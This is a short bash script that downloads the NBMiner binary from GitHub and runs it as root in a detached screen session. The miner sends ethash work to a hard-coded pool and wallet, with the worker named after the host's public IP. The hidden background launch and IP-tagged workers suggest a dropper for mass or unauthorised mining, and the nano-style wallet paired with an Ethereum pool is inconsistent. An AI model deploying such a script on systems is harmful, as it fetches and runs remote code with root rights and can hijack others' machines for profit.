#!/bin/bash

WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
PAL=stratum+tcp://eth.2miners.com:2020
WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
COMA="-a ethash -o $PAL -u $WELS.$WER -log"



FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    apt install screen -y
    wget https://github.com/NebuTech/NBMiner/releases/download/v39.6/NBMiner_39.6_Linux.tgz
    tar zxvf NBMiner_39.6_Linux.tgz
    cd NBMiner_Linux
    chmod +x *
fi
screen -dmLS mine sudo ./nbminer $COMA
